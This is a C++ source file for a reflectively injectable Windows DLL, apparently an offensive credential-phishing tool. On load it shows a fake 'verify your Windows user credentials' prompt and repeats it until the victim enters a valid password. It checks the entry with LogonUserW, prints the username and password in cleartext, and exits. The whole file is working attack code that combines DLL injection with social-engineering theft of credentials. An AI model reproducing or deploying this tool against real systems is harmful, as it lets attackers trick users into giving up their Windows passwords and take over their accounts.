//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
#include <Windows.h>
#include <tchar.h>
#include <CommCtrl.h>
#include <wincred.h>
#include <iostream>
#include <atlstr.h>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Credui.lib")

void pickl3() {

	BOOL loginStatus = FALSE;
	do {
		CREDUI_INFOW credui = {};
		credui.cbSize = sizeof(credui);
		credui.hwndParent = nullptr;
		//credui.pszMessageText = L"...";
		credui.pszCaptionText = L"Please verify your Windows user credentials to proceed.";
		credui.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID outCredBuffer = nullptr;
		ULONG outCredSize = 0;
		BOOL save = false;
		DWORD err = 0;

		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_CURRENT_USER);
		if (err == ERROR_SUCCESS) {
			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD maxLenName = CREDUI_MAX_USERNAME_LENGTH + 1;
			DWORD maxLenPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outCredBuffer, outCredSize, pszUName, &maxLenName, domain, &maxLenDomain, pszPwd, &maxLenPassword);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(pszUName, parsedUserName, CREDUI_MAX_USERNAME_LENGTH + 1, parsedDomain, CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);


			if (loginStatus == TRUE) {
				CloseHandle(handle);
				//std::wcout << "\n[+] Valid credential is entered as " << pszUName << ":" << pszPwd;
				printf("\n[+] Valid credential is entered as %ws:%ws", pszUName ,pszPwd);
				break;
			}
		}
	} while (loginStatus == FALSE);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		pickl3();

		fflush(stdout);
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
